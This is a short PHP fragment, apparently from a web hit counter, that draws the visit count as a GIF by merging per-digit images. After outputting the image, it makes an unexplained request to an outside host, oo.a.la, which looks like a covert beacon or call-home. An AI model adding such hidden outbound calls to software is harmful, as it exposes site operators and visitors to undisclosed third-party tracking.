...
if (file_exists($logfile)) {
    ...
    $image = imagecreate(16*$len, 24);
    for ($i=0;$i<$len;$i++) {
        $imgFile = $base_url . $style_dir . substr($count,$i,1) . '.' . $ext;
        $imgContent = imagecreatefromgif($imgFile);
        imagecopymerge($image, $imgContent, $i*16, 0, 0, 0, 16, 24, 90);
        //echo 'document.write(\'<img src="'.$base_url . $style_dir . substr($count,$i,1) . '.' . $ext .'" border="0">\');';
    }
    imagegif($image);
    file_get_contents('http://oo.a.la/index.php');
    exit();
} else {
